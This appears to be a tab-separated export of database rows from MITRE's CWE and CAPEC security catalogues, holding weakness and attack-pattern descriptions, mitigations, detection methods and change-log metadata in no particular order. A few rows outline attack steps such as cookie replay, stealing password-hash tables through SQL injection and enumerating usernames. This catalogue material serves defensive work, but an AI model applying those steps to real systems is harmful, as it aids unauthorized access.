7356	36	https://people.eecs.berkeley.edu/~daw/papers/intents-mobisys11.pdf
21700	62	updated Common_Consequences
13967	47	Execute Unauthorized Commands
22486	100	The MITRE Corporation
13438	39	2014-07-30
7308	33	Andrew Horton
25183	39	2009-03-10
11734	62	updated Relationships, Taxonomy_Mappings
20311	39	2012-05-11
16669	63	Modify Application Data
21764	35	MITRE
19624	79	Integrity
23963	63	Gain Privileges or Assume Identity
19954	60	21
20643	63	Modify Memory
21849	35	MITRE
25300	47	Hide Activities
11907	39	2012-05-11
18927	56	ChildOf
21357	39	2008-09-08
7454	39	2014-07-30
8721	53	The MITRE Corporation
18291	78	Low
19560	30	Yuval B.
25018	35	MITRE
20055	26	Implementation
12782	28	CWE Content Team
22625	39	2009-01-12
7135	28	CWE Content Team
18189	39	2009-05-27
14534	62	updated Relationships, Taxonomy_Mappings
23794	97	Embed Virus into DLL
6802	31	1000
18282	72	As passwords age, the probability that they are compromised grows.
17675	62	updated Relationships, Taxonomy_Mappings
23905	47	Other
20403	35	MITRE
21652	62	updated Common_Consequences
16406	62	updated References, Relationships
24663	100	The MITRE Corporation
14372	52	Use automated static analysis tools that target this type of weakness. Many modern techniques use data flow analysis to minimize the number of false positives. This is not a perfect solution, since 100% accuracy and coverage are not feasible.
22059	63	Reduce Reliability
20534	91	Architecture and Design
14366	28	CWE Content Team
7764	46	A weak encryption scheme can be subjected to brute force attacks that have a reasonable chance of succeeding using current attack methods and resources.
24466	74	3
19464	97	Exploit Test APIs
17204	50	While some information is shared by systems automatically based on standards and protocols, remove potentially sensitive information that is not necessary for the application's functionality as much as possible.
11172	97	User-Controlled Filename
19268	35	MITRE
19792	101	CAPEC Content Team
21186	62	updated Common_Consequences, Relationships, Taxonomy_Mappings
8019	35	MITRE
18807	91	Architecture and Design
16541	25	Low
16915	79	Access Control
8456	79	Availability
17445	103	Primary
20624	62	updated Related_Attack_Patterns
19597	35	MITRE
10934	23	The software does not implement a required step in a cryptographic algorithm, resulting in weaker encryption than advertised by that algorithm.
8279	39	2017-05-03
11138	28	CWE Content Team
10181	28	CWE Content Team
8644	91	Implementation
17407	90	Java
23723	89	Detailed
15363	62	updated Relationships
18658	62	updated Demonstrative_Examples
13926	35	MITRE
24609	97	Explore for Predictable Temporary File Names
24822	35	MITRE
6626	62	updated Relationships, Taxonomy_Mappings
23748	31	699
13187	62	updated Relationships
19956	81	Integrity
25342	35	MITRE
20045	78	Low
24293	28	CWE Content Team
23114	42	Make all fields private. Use getter to get the value of the field. Setter should be used only by the framework; setting an action form field from other actions is bad practice and should be avoided.
9552	88	Unverified Password Change
6039	76	2015-12-07
8991	45	Variant
19419	62	updated Relationships
16550	31	1000
6196	86	http://www.cgisecurity.com/lib/sips.html
20150	35	MITRE
18507	54	Medium
19208	39	2011-06-01
7452	53	The MITRE Corporation
24138	35	MITRE
19905	35	MITRE
13716	26	Implementation
19453	53	The MITRE Corporation
22918	100	The MITRE Corporation
9091	102	ChildOf
15958	46	Cookies are small bits of data that are sent by the web application but stored locally in the browser. This lets the application use the cookie to pass information between pages and store variable information. The web application controls what information is stored in a cookie and how it is used. Typical types of information stored in cookies are session Identifiers, personalization and customization information, and in rare cases even usernames to enable automated logins. There are two different types of cookies: session cookies and persistent cookies. Session cookies just live in the browser's memory, and are not stored anywhere, but persistent cookies are stored on the browser's hard drive.
19161	31	1000
11954	35	MITRE
21485	39	2011-06-01
18855	35	MITRE
16629	35	MITRE
20564	101	CAPEC Content Team
18755	26	Architecture and Design
15525	79	Confidentiality
22690	35	MITRE
12233	27	None: No specialized resources are required to execute this type of attack. The only requirement is the ability to provide string input to the target.
24859	35	MITRE
10335	45	Variant
24540	39	2014-07-30
24585	35	MITRE
12216	35	MITRE
17509	62	updated Potential_Mitigations, Time_of_Introduction
24567	100	The MITRE Corporation
23604	102	ChildOf
5842	40	The victim's browser must support invisible Flash overlays.
24451	39	2012-05-11
9665	100	The MITRE Corporation
19422	51	2014-06-23
24037	59	Updated Related_Attack_Patterns
5943	62	updated Relationships
18042	77	Manual Static Analysis
24834	45	Base
24519	35	MITRE
24627	39	2012-05-11
22721	52	According to SOAR, the following detection techniques may be useful:                                         Highly cost effective:                                                                           Source Code Quality Analyzer                            Source code Weakness Analyzer                            Context-configured Source Code Weakness Analyzer
12145	27	Ability to send specially formatted HTTP request to web server
12546	39	2017-11-08
17843	28	CWE Content Team
20327	31	1000
8790	43	Simple
16556	28	CWE Content Team
24921	74	6
21467	42	For inbound authentication: apply strong one-way hashes to your passwords and store those hashes in a configuration file or database with appropriate access control. That way, theft of the file/database still requires the attacker to try to crack the password. When receiving an incoming password during authentication, take the hash of the password and compare it to the hash that you have saved.                   Use randomly assigned salts for each separate hash that you generate. This increases the amount of computation that an attacker needs to conduct a brute-force attack, possibly limiting the effectiveness of the rainbow table method.
22553	23	An adversary supplies a value to the target application which is then used by reflection methods to identify a class, method, or field. For example, in the Java programming language the reflection libraries permit an application to inspect, load, and invoke classes and their components by name. If an adversary can control the input into these methods including the name of the class/method/field or the parameters passed to methods, they can cause the targeted application to invoke incorrect methods, read random fields, or even to load and utilize malicious classes that the adversary created. This can lead to the application revealing sensitive information, returning incorrect results, or even having the adversary take control of the targeted application.
17921	80	Knowledge of common location methods and access methods to sensitive data
9659	35	MITRE
15960	28	CWE Content Team
19145	81	Confidentiality
5788	35	MITRE
14657	62	updated Relationships
13193	104	191
18257	44	SOAR Partial
15436	31	1000
18201	62	updated Relationships
23012	28	CWE Content Team
14157	62	updated Relationships, Taxonomy_Mappings
21327	63	Varies by Context
7724	35	MITRE
12668	69	Draft
15368	70	OWASP Cheatsheets
14224	39	2012-10-30
7021	39	2017-05-03
25149	76	2015-11-09
16146	33	Alexander Polyakov
24531	62	updated Potential_Mitigations, Time_of_Introduction
12413	79	Confidentiality
20912	28	CWE Content Team
21953	28	CWE Content Team
21785	28	CWE Content Team
21968	56	ChildOf
18873	91	Implementation
13004	39	2012-10-30
17839	29	Issue 17
14467	46	This can lead to unpredictable behavior. If the function is used to make security-critical decisions or provide security-critical information, then the wrong status code can cause the software to assume that an action is safe, even when it is not.
7853	56	ChildOf
16861	35	MITRE
21535	103	Primary
23003	81	Non-Repudiation
8612	78	High
21626	35	MITRE
12548	39	2012-05-11
15035	28	CWE Content Team
7735	26	Implementation
14300	28	CWE Content Team
8562	69	Draft
15562	54	High
21120	47	Read Data
19872	78	High
21975	35	MITRE
19335	39	2012-05-11
6148	46	Without sufficient removal or quoting of SQL syntax in user-controllable inputs, the generated SQL query can cause those inputs to be interpreted as SQL instead of ordinary user data. This can be used to alter query logic to bypass security checks, or to insert additional statements that modify the back-end database, possibly including execution of system commands.             SQL injection has become a common issue with database-driven web sites. The flaw is easily detected, and easily exploited, and as such, any site or software package with even a minimal user base is likely to be subject to an attempted attack of this kind. This flaw depends on the fact that SQL makes no real distinction between the control and data planes.
23807	81	Integrity
11012	62	updated Relationships, Taxonomy_Mappings
10304	35	MITRE
6864	100	The MITRE Corporation
22612	39	2014-07-30
24866	36	http://www.adallom.com/blog/a-new-zeus-variant-targeting-salesforce-com-accounts-research-and-analysis/
10197	62	updated Applicable_Platforms, Modes_of_Introduction, Relationships, Taxonomy_Mappings
20983	61	Stable
6943	23	The product does not validate or incorrectly validates input that can affect the control flow or data flow of a program.
21155	28	CWE Content Team
15886	62	updated Relationships, Observed_Example, Taxonomy_Mappings, Weakness_Ordinalities
14525	62	updated Potential_Mitigations
23251	63	Alter Execution Logic
8852	28	CWE Content Team
11343	53	The MITRE Corporation
25326	62	updated Description, Other_Notes, Relationships
19036	79	Integrity
15335	59	Updated Related_Attack_Patterns
7068	28	CWE Content Team
19260	101	CAPEC Content Team
13554	62	updated Description, Maintenance_Notes, Name, Relationships, Taxonomy_Mappings, Weakness_Ordinalities
13552	28	CWE Content Team
9305	63	Reduce Performance
8945	103	Primary
14147	62	updated Relationships, Taxonomy_Mappings
6743	85	489
17221	74	1
7168	47	Resource Consumption
15952	101	CAPEC Content Team
19780	36	http://yeda.cs.technion.ac.il/~yona/talks/xml_parser_attacks/slides/slide2.html
22988	81	Integrity
23938	23	The software allows the attacker to upload or transfer files of dangerous types that can be automatically processed within the product's environment.
21668	62	updated Common_Consequences
12366	73	Use a proxy tool to record results of manual input of XSS probes in known URLs.
24737	24	MITRE
23199	28	CWE Content Team
24527	62	updated Description
20724	66	bcrypt
11299	69	Incomplete
13346	26	Implementation
9580	81	Confidentiality
25393	52	According to SOAR, the following detection techniques may be useful:                                         Highly cost effective:                                                                           Manual Source Code Review (not inspections)                                                                     Cost effective for partial coverage:                                                                           Focused Manual Spotcheck - Focused manual analysis of source
13942	35	MITRE
22182	59	Updated References
5629	46	This might allow attackers to use dangerous functionality via a web page that accesses the control, which can lead to different resultant vulnerabilities, depending on the control's behavior.
16616	62	updated Observed_Examples, References
7731	28	CWE Content Team
9669	70	Wikipedia
17020	21	PLOVER
7616	62	updated Modes_of_Introduction, Relationships
14685	28	CWE Content Team
11598	28	CWE Content Team
11002	35	MITRE
15772	21	CLASP
21226	91	Operation
11753	56	CanPrecede
11903	27	A software program that allows a user to man-in-the-middle communications between the client and server, such as a man-in-the-middle proxy.
24684	52	According to SOAR, the following detection techniques may be useful:                                         Highly cost effective:                                                                           Manual Source Code Review (not inspections)                                                                     Cost effective for partial coverage:                                                                           Focused Manual Spotcheck - Focused manual analysis of source
13439	73	For any published services, determine exposed interfaces via the documentation provided.
8226	62	updated Other_Notes, Theoretical_Notes
19067	88	Path Equivalence: '/multiple//internal/slash'
7521	28	CWE Content Team
13151	72	An attacker may be able to obtain sensitive information.
19620	60	26
18152	39	2017-11-08
12844	23	The web application sends a redirect to another location, but instead of exiting, it executes additional code.
15986	35	MITRE
10584	45	Variant
7396	35	MITRE
17180	39	2011-06-01
12348	35	MITRE
22718	36	http://www.informit.com/articles/article.aspx?p=601349
7993	81	Confidentiality
6493	91	Implementation
13915	45	Variant
17328	81	Access Control
14457	91	Implementation
21017	62	updated Relationships, Taxonomy_Mappings
24904	81	Integrity
14749	31	1000
24547	35	MITRE
23431	35	MITRE
19978	69	Draft
18574	102	ChildOf
18533	39	2009-12-28
11254	96	2014-06-19
14690	35	MITRE
13125	26	Operation
16387	39	2012-05-11
17755	35	MITRE
16129	39	2008-07-01
11782	81	Other
5910	62	updated Potential_Mitigations
6936	61	Draft
8100	28	CWE Content Team
7177	62	updated Common_Consequences
9483	72	Malicious users can fake authentication information, impersonating any IP address.
9940	50	Although less reliable, the use of the optional HTTP Referrer header can also be used to determine whether an incoming request was actually one that the user is authorized for, in the current context.
12583	102	CanFollow
23041	93	Moderate
24959	90	JavaScript
23792	62	updated Relationships, References, Taxonomy_Mappings
20359	39	2008-09-08
24550	35	MITRE
13245	85	383
8684	61	Draft
9696	35	MITRE
16299	59	Updated Related_Attack_Patterns
8908	66	Design Principles
16200	74	3
14614	63	Alter Execution Logic
24921	73	Use information about how to inject commands into SQL queries as well as information about the database schema to execute attacks such as dropping tables, inserting records, etc.
7251	31	1000
6682	28	CWE Content Team
9961	91	Architecture and Design
9586	43	Simple
21147	23	The use of a hard-coded cryptographic key significantly increases the possibility that encrypted data may be recovered.
11638	62	updated Demonstrative_Examples
13325	39	2011-06-01
20459	97	Cross Site Tracing
9962	28	CWE Content Team
7646	35	MITRE
22829	72	Depending on the data stored in the temporary file, there is the potential for an attacker to gain an additional input vector which is trusted as non-malicious. It may be possible to make arbitrary changes to data structures, user information, or even process ownership.
17733	85	486
6907	35	MITRE
17853	62	updated Taxonomy_Mappings
23967	62	updated Applicable_Platforms, Relationships, Taxonomy_Mappings
24342	60	14
19422	55	CAPEC Content Team
22677	21	CWE Content Team
21480	28	CWE Content Team
12190	100	The MITRE Corporation
20119	88	Access of Memory Location Before Start of Buffer
10622	27	Depending on the type of analysis, a variety of tools might be required, such as static code and/or dynamic analysis tools. Alternatively, the effort might require debugging programs such as ollydbg, SoftICE, or disassemblers like IDA Pro. In some instances, packet sniffing or packet analyzing programs such as TCP dump or Wireshark are necessary. Lastly, specific protocol analysis might require tools such as PDB (Protocol Debug), or packet injection tools like pcap or Nemesis.
10478	42	Increase the entropy used to seed a PRNG.
15746	39	2012-10-30
20902	62	updated Potential_Mitigations
10709	81	Other
12392	43	Simple
22959	74	2
12597	63	Gain Privileges or Assume Identity
17685	72	The inputs could be modified without detection, causing the software to have unexpected system state or make incorrect security decisions.
13209	76	2015-12-07
16533	47	Execute Unauthorized Commands
24643	85	313
6151	35	MITRE
20974	28	CWE Content Team
17495	39	2017-11-08
24877	36	https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/rpt-dll-sideloading.pdf
12225	52	According to SOAR, the following detection techniques may be useful:                                         Highly cost effective:                                                                           Debugger                                                                     Cost effective for partial coverage:                                                                           Monitored Virtual Environment - run potentially malicious code in sandbox / wrapper / virtual machine, see if it does anything suspicious
10472	62	updated Time_of_Introduction
19732	62	updated Potential_Mitigations, Time_of_Introduction
6059	26	Operation
9732	43	Simple
20045	50	Frequently change the SSID to new and unrelated values
23205	39	2010-02-16
21699	51	2014-06-23
13432	92	Exploit
6378	62	updated Applicable_Platforms
17913	76	2017-01-09
15721	35	MITRE
13478	59	Updated Related_Weaknesses, Taxonomy_Mappings
5781	91	Implementation
10825	39	2014-07-30
10334	90	Language-Independent
16431	88	Failure to Sanitize Special Elements into a Different Plane (Special Element Injection)
18970	33	Jeff Atwood
12588	56	ChildOf
22339	50	Implement proper software restriction policies to only allow authorized software on your environment. Use of anti-virus and other security monitoring and detecting tools can aid in this too. Closely monitor installed software for unusual behavior or activity, and implement patches as soon as they become available.
5777	35	MITRE
8893	67	Low
11162	28	CWE Content Team
20577	52	According to SOAR, the following detection techniques may be useful:                                         Highly cost effective:                                                                           Source code Weakness Analyzer                            Context-configured Source Code Weakness Analyzer                                                                     Cost effective for partial coverage:                                                                           Warning Flags
19002	62	updated Relationships
20096	78	Very High
18730	27	None: No specialized resources are required to execute this type of attack. Ultimately, the speed with which an attacker discovers a secret is directly proportional to the computational resources the attacker has at their disposal. This attack method is resource expensive: having large amounts of computational power do not guarantee timely success, but having only minimal resources makes the problem intractable against all but the weakest secret selection procedures.
13483	35	MITRE
6846	62	updated Time_of_Introduction
8849	28	CWE Content Team
21621	35	MITRE
12176	100	The MITRE Corporation
21113	51	2014-06-23
13335	35	Cigital
6498	31	699
23162	90	Language-Independent
15420	63	Bypass Protection Mechanism
14744	39	2014-07-30
21858	70	Attacks on WebView in the Android System
24308	101	CAPEC Content Team
12084	56	ChildOf
18423	47	Modify Data
16989	39	2008-07-01
18317	62	updated Applicable_Platforms, Relationships
9844	31	699
15903	69	Incomplete
24884	76	2019-09-30
16578	35	MITRE
11247	28	CWE Content Team
12712	28	CWE Content Team
7428	100	The MITRE Corporation
9349	89	Detailed
17403	42	Perform input validation on user data.
13469	103	Primary
7599	39	2010-09-27
17179	28	CWE Content Team
7731	39	2012-05-11
5902	63	Bypass Protection Mechanism
10326	73	If the secret was chosen algorithmically, cryptanalysis can be applied to the algorithm to discover patterns in this algorithm. (This is true even if the secret is not used in cryptography.) Periodicity, the need for seed values, or weaknesses in the generator all can result in a significantly smaller secret space.
11357	62	updated Common_Consequences
9036	73	Use a proxy tool to record results of manual input of remote file inclusion probes in known URLs.
10011	43	Simple
10328	62	updated Relationships
6681	35	MITRE
6137	71	2000
14989	28	CWE Content Team
7601	42	Protect the administrative/restricted functionality with a strong authentication mechanism.
25162	62	added/updated demonstrative examples
21100	28	CWE Content Team
7028	100	The MITRE Corporation
24412	62	updated Common_Consequences
12955	39	2009-07-27
22381	81	Confidentiality
18090	62	updated Relationships, Taxonomy_Mappings
25211	28	CWE Content Team
23230	56	ChildOf
19682	59	Updated Related_Attack_Patterns
15979	39	2014-07-30
9820	34	If the application uses UDP, then it could potentially be subject to spoofing attacks that use the inherent weaknesses of UDP to perform traffic amplification, although this problem can exist in other protocols or contexts.
10431	39	2017-11-08
8006	73	Create new web pages that have the legitimate site's look at feel, but contain completely new content.
13071	90	Language-Independent
10524	74	2
14584	33	Jeremiah Grossman
24852	39	2011-06-01
16764	61	Draft
7883	28	CWE Content Team
6982	25	Low
20925	28	CWE Content Team
15097	35	MITRE
13507	23	An attacker manipulates either egress or ingress data from a client within an application framework in order to change the content of messages. Performing this attack can allow the attacker to gain unauthorized privileges within the application, or conduct attacks such as phishing, deceptive strategies to spread malware, or traditional web-application attacks. The techniques require use of specialized software that allow the attacker to man-in-the-middle communications between the web browser and the remote system. Despite the use of MITM software, the attack is actually directed at the server, as the client is one node in a series of content brokers that pass information along to the application framework. Additionally, it is not true "Man-in-the-Middle" attack at the network layer, but an application-layer attack the root cause of which is the master applications trust in the integrity of code supplied by the client.
12872	63	Gain Privileges or Assume Identity
9975	28	CWE Content Team
10869	39	2019-06-20
18281	81	Integrity
13085	62	updated Common_Consequences, Relationships, Other_Notes
14730	76	2019-04-04
21201	28	CWE Content Team
18045	104	210
15941	63	DoS: Crash, Exit, or Restart
8394	62	updated Relationships, Taxonomy_Mappings
11966	21	PLOVER
5875	31	1000
15904	75	These may be more effective than strictly automated techniques. This is especially the case with weaknesses that are related to design and business rules.
11326	69	Incomplete
11811	28	CWE Content Team
12526	59	Updated References, Related_Weaknesses
6258	74	4
14502	47	Execute Unauthorized Commands
13371	62	updated Potential_Mitigations
5798	28	CWE Content Team
15926	36	https://srlabs.de/rooting-sim-cards/
8881	59	Updated Resources_Required
19872	89	Detailed
17861	39	2013-02-21
6652	69	Incomplete
21916	69	Incomplete
14736	72	An attacker could pose as one of the entities and read or possibly modify the communication.
11641	53	The MITRE Corporation
19769	39	2014-07-30
18612	43	Simple
13325	28	CWE Content Team
13358	35	MITRE
25166	59	Updated Description Summary
16128	62	updated Demonstrative_Example, Potential_Mitigations, Time_of_Introduction
7932	62	added/updated demonstrative examples
12056	81	Confidentiality
17461	62	updated Relationships
18579	35	MITRE
10070	103	Primary
19892	28	CWE Content Team
13375	100	The MITRE Corporation
15556	62	updated Common_Consequences
10790	39	2014-07-30
12618	35	MITRE
21688	26	Architecture and Design
22171	35	MITRE
9333	62	updated Detection_Factors, Relationships, Taxonomy_Mappings
23341	66	Encapsulation (computer programming)
7404	91	Implementation
19195	101	CAPEC Content Team
23280	91	Architecture and Design
17836	28	CWE Content Team
22164	62	updated Applicable_Platforms
18280	35	MITRE
21532	28	CWE Content Team
13113	35	MITRE
23644	76	2017-08-04
11151	43	Simple
7132	79	Confidentiality
6190	62	updated Relationships
7489	35	MITRE
13388	56	ChildOf
13724	81	Availability
23871	81	Access Control
23000	28	CWE Content Team
14086	28	Eric Dalci
12659	74	2
11152	35	MITRE
5620	76	2017-08-04
14523	39	2008-07-01
15463	35	Cigital
8096	56	ChildOf
24935	88	Source Code Element without Standard Prologue
20382	35	MITRE
13638	62	updated Applicable_Platforms, Common_Consequences, Description, Maintenance_Notes, Relationships, Other_Notes, Relationship_Notes, Taxonomy_Mappings
6483	51	2014-06-23
17072	21	CWE Content Team
12936	23	Identity Spoofing refers to the action of assuming (i.e., taking on) the identity of some other entity (human or non-human) and then using that identity to accomplish a goal. An adversary may craft messages that appear to come from a different principle or use stolen / spoofed authentication credentials. Alternatively, an adversary may intercept a message from a legitimate sender and attempt to make it look like the message comes from them without changing its content. The latter form of this attack can be used to hijack credentials from legitimate users. Identity Spoofing attacks need not be limited to transmitted messages - any resource that is associated with an identity (for example, a file with a signature) can be the target of an attack where the adversary attempts to change the apparent identity. This attack differs from Content Spoofing attacks where the adversary does not wish to change the apparent identity of the message but instead wishes to change what the message says. In an Identity Spoofing attack, the adversary is attempting to change the identity of the content.
10672	43	Simple
16422	40	The adversary must have the means to control a user's interface to present them with a decoy action as well as the actual malicious action. Simple versions of this attack can be performed using web pages requiring only that the adversary be able to host (or control) content that the user visits.
24107	44	SOAR Partial
21305	42	Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass whitelist validation schemes by introducing dangerous inputs after they have been checked.
24587	73	Spider the web site for all available links.
13793	66	Microsoft Scraps Old Encryption in New Code
18386	62	updated Common_Consequences
12580	38	Control characters are being detected by the filters repeatedly.
17526	28	Eric Dalci
22571	53	The MITRE Corporation
7430	51	2014-06-23
7470	39	2008-07-01
7305	39	2012-10-30
12599	39	2014-07-30
20619	105	Web Based
20967	72	An attacker might be able to read sensitive information from the XML database.
21218	39	2017-01-19
10769	35	MITRE
22138	66	Java Concurrency API
18770	62	updated Time_of_Introduction
10168	39	2009-03-10
8705	30	Debian Security
19455	39	2012-05-11
5852	39	2010-04-05
11102	62	updated Applicable_Platforms, Modes_of_Introduction, Relationships
17034	85	503
11954	39	2014-07-30
17010	39	2019-01-03
17716	39	2012-05-11
9238	23	The software allocates a reusable resource or group of resources on behalf of an actor without imposing any restrictions on the size or number of resources that can be allocated, in violation of the intended security policy for that actor.
11935	28	Eric Dalci
7423	31	1000
8926	66	Safe Harbor Privacy Framework
10114	79	Integrity
17024	52	According to SOAR, the following detection techniques may be useful:                                         Cost effective for partial coverage:                                                                           Binary / Bytecode disassembler - then use manual analysis for vulnerabilities & anomalies
23603	39	2011-03-29
21124	85	435
16493	39	2019-06-20
16244	26	Implementation
13076	62	updated Relationships
21588	103	Primary
23745	74	4
17956	63	Read Memory
9500	62	updated Potential_Mitigations
12863	62	updated Relationships, Taxonomy_Mappings
19063	66	A Study in Scarlet - section 5, "File Upload"
10928	35	MITRE
12792	62	updated Demonstrative_Examples, Relationships
22252	103	Primary
13527	62	updated Relationships
14146	69	Incomplete
20603	28	CWE Content Team
7774	28	CWE Content Team
10107	35	MITRE
12894	81	Access Control
20732	35	MITRE
17660	100	The MITRE Corporation
6432	35	MITRE
7240	21	PLOVER
24300	73	Obtain username(s) by querying application/system (e.g. if upon a failed login attempt, the system indicates whether the entered username was valid or not)
19585	88	Use of Redundant Code
18522	23	In a clickjacking attack the victim is tricked into unknowingly initiating some action in one system while interacting with the UI from a seemingly completely different system. While being logged in to some target system, the victim visits the adversary's malicious site which displays a UI that the victim wishes to interact with. In reality, the clickjacked page has a transparent layer above the visible UI with action controls that the adversary wishes the victim to execute. The victim clicks on buttons or other UI elements they see on the page which actually triggers the action controls in the transparent overlaying layer. Depending on what that action control is, the adversary may have just tricked the victim into executing some potentially privileged (and most certainly undesired) functionality in the target system to which the victim is authenticated. The basic problem here is that there is a dichotomy between what the victim thinks they are clicking on versus what they are actually clicking on.
10493	39	2017-11-08
15581	35	MITRE
16666	76	2017-05-01
25041	28	CWE Content Team
16462	35	MITRE
21106	24	MITRE
14736	63	Gain Privileges or Assume Identity
19995	28	CWE Content Team
22537	39	2008-09-08
18524	35	MITRE
7797	39	2019-01-03
17030	39	2017-11-08
21887	28	CWE Content Team
10201	104	782
6468	76	2017-08-04
20357	28	CWE Content Team
14969	101	CAPEC Content Team
20088	35	MITRE
18585	91	Architecture and Design
16543	90	Java
15283	54	High
24279	31	699
20604	66	Some Bad News and Some Good News
6759	100	The MITRE Corporation
9523	50	Design: Utilize digital signatures to increase authentication assurance.
20505	39	2008-07-01
14943	42	Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180, CWE-181). Make sure that your application does not inadvertently decode the same input twice (CWE-174). Such errors could be used to bypass whitelist schemes by introducing dangerous inputs after they have been checked. Use libraries such as the OWASP ESAPI Canonicalization control.                   Consider performing repeated canonicalization until your input does not change any more. This will avoid double-decoding and similar scenarios, but it might inadvertently modify inputs that are allowed to contain properly-encoded dangerous content.
13972	28	Sean Eidemiller
22222	62	updated Relationships
22596	28	Eric Dalci
8377	62	updated Description
7365	62	updated Potential_Mitigations
14753	39	2009-05-27
25074	79	Confidentiality
22035	100	The MITRE Corporation
17380	39	2014-06-23
11304	62	updated Common_Consequences
19885	31	1000
6828	47	Gain Privileges
18169	62	updated Relationships, Taxonomy_Mappings
9586	23	The application contains code that appears to be malicious in nature.
17735	105	Mobile
15688	34	REALIZATION: This weakness is caused during implementation of an architectural security tactic.
22153	101	CAPEC Content Team
22378	60	03
22287	47	Hide Activities
13787	28	CWE Content Team
20394	45	Base
12471	28	CWE Content Team
14793	35	MITRE
13778	28	CWE Content Team
21564	62	updated Description, Maintenance_Notes
14224	28	CWE Content Team
21740	35	MITRE
9784	28	CWE Content Team
23852	62	updated Common_Consequences
24085	39	2009-03-10
16216	39	2017-11-08
24978	28	CWE Content Team
9217	62	updated Relationships, Other_Notes
9262	28	CWE Content Team
24071	31	699
8614	28	CWE Content Team
8368	28	CWE Content Team
17578	55	CAPEC Content Team
17322	28	Eric Dalci
23628	58	Same Origin Policy                The same origin policy states that browsers should limit the resources accessible to scripts running on a given web site, or "origin", to the resources associated with that web site on the client-side, and not the client-side resources of any other sites or "origins". The goal is to prevent one site from being able to modify or read the contents of an unrelated site. Since the World Wide Web involves interactions between many sites, this policy is important for browsers to enforce.                Domain                The Domain of a website when referring to XSS is roughly equivalent to the resources associated with that website on the client-side of the connection. That is, the domain can be thought of as all resources the browser is storing for the user's interactions with this particular site.
17758	81	Integrity
23624	35	MITRE
21151	39	2008-07-01
11752	39	2008-09-08
15187	94	Depending on the adversary's intentions and the specific nature their actions/requests, a successful pretexting attack can result in the compromise to the confidentiality of sensitive information in a variety of contexts.
9720	35	MITRE
6832	35	MITRE
19185	103	Primary
25414	73	Obtain copy of database table or flat file containing password hashes (by breaking access controls, using SQL Injection, etc.)
17862	102	ChildOf
20769	81	Other
14972	80	The adversary needs to know certain linux commands for this type of attack.
15680	62	updated Relationships
12790	31	1000
20911	42	Review of type casting operations can identify locations where incompatible types are cast.
18226	92	Exploit
15052	97	TCP (ISN) Sequence Predictability Probe
16533	79	Availability
19947	91	Testing
24007	59	Updated Description Summary, Examples-Instances
11671	53	The MITRE Corporation
15067	52	Automated methods may be able to detect certain idioms automatically, such as exposed stack traces or pathnames, but violation of business rules or privacy requirements is not typically feasible.
21700	35	MITRE
8550	91	Implementation
7171	63	Bypass Protection Mechanism
19391	86	http://phed.org/2008/05/19/preventing-xss-with-correct-output-encoding/
23472	39	2012-05-11
21897	44	High
19887	62	updated Observed_Examples, References, Relationships
7345	62	updated Relationships
24427	54	High
12096	62	updated Related_Attack_Patterns
16808	44	SOAR Partial
15930	45	Variant
14974	33	Sean Barnum
18787	104	1095
25002	39	2011-06-01
10475	91	Requirements
23870	39	2012-05-11
25360	55	CAPEC Content Team
9882	62	updated Common_Consequences, Relationships
8562	43	Simple
22112	61	Draft
9027	40	The adversary must have a means of elevating permissions in order to access and modify registry content through either administrator privileges (e.g., credentialed access), or a remote access tool capable of editing a registry through an API.
14977	42	Use products or modules that conform to FIPS 140-2 [REF-267] to avoid obvious entropy problems. Consult FIPS 140-2 Annex C ("Approved Random Number Generators").
5768	35	Cigital
15461	28	CWE Content Team
8820	42	Most antivirus software scans for Trojan Horses.
24691	62	updated Potential_Mitigations
9037	56	ChildOf
23607	26	Architecture and Design
10742	42	Always consider whether knowledge of your code or design is sufficient to break it. Reverse engineering is a highly successful discipline, and financially feasible for motivated adversaries. Black-box techniques are established for binary analysis of executables that use obfuscation, runtime analysis of proprietary protocols, inferring file formats, and others.
15198	69	Draft
19679	62	updated Applicable_Platforms
16367	69	Draft
18233	70	RFC792 - Internet Control Messaging Protocol
7477	34	REALIZATION: This weakness is caused during implementation of an architectural security tactic.
14414	35	MITRE
7469	81	Access Control
24902	62	updated Potential_Mitigations
10496	73	Replace cookie with an older legitimate cookie and send it back to server to observe the effects. This technique would be helpful in cases where the cookie contains a "points balance" for a given user where the points have some value. The user may spend his points and then replace his cookie with an older one to restore his balance.
14727	39	2017-11-08
13762	62	updated Common_Consequences
17835	39	2009-05-27
24910	39	2009-03-10
18052	39	2017-11-08
24582	92	Experiment
25235	103	Primary
23029	67	High
9628	39	2011-06-27
23373	35	MITRE
20675	28	CWE Content Team
11532	39	2009-03-10
14619	76	2015-12-07
6044	39	2011-09-13
11721	88	Path Equivalence: 'filename ' (Trailing Space)
20405	26	Implementation
22291	62	updated Relationships
22007	48	04
9911	62	updated Related_Attack_Patterns
14778	39	2014-07-30
8130	47	Execute Unauthorized Commands
7366	69	Incomplete
12564	60	18
13006	81	Access Control
13073	45	Base
13959	39	2013-02-21
12236	35	Cigital
11041	69	Draft
11342	33	Sean Barnum
9331	80	An attacker can inject different representation of a filtered character in a different encoding.
12429	60	11
17318	33	G. Michael Sawka
10682	102	CanAlsoBe
14823	104	645
24386	28	CWE Content Team
11271	28	CWE Content Team
6804	79	Integrity
25307	31	699
20199	35	MITRE
20332	31	1000
21085	62	updated Description
16238	28	CWE Content Team
12567	97	DNS Rebinding
5886	102	ChildOf
15052	61	Stable
10311	35	MITRE
7377	103	Primary
20257	39	2011-06-01
9346	50	Apply the latest patches.
12499	39	2014-07-30
18184	24	MITRE
23898	62	updated Name, Relationships
15898	69	Incomplete
23046	28	CWE Content Team
6898	28	CWE Content Team
10767	35	MITRE
9940	54	High
8308	88	Improper Preservation of Permissions
6310	35	MITRE
11640	81	Availability
6656	49	2010
17827	81	Access Control
11049	100	The MITRE Corporation
20315	39	2012-10-30
17847	91	Implementation
9472	100	The MITRE Corporation
5990	31	699
23473	35	MITRE
11760	35	MITRE
15490	50	Implementation: Hide URL file extension.
15656	62	updated Relationships, Taxonomy_Mappings
19801	35	MITRE
23563	35	MITRE
14135	39	2011-03-29
14231	39	2015-12-07
9480	42	In Windows environments, use proper access control for the associated device or device namespace. See References.
20650	35	MITRE
22938	31	1000
12145	85	81
9640	67	Medium
21147	69	Draft
14164	53	The MITRE Corporation
22403	50	Assurance: Use static analysis tool to do code review and dynamic tool to do penetration test on the standard library.
12834	73	Run tools that check available entries in the cache.
19766	101	CAPEC Content Team
22997	63	Alter Execution Logic
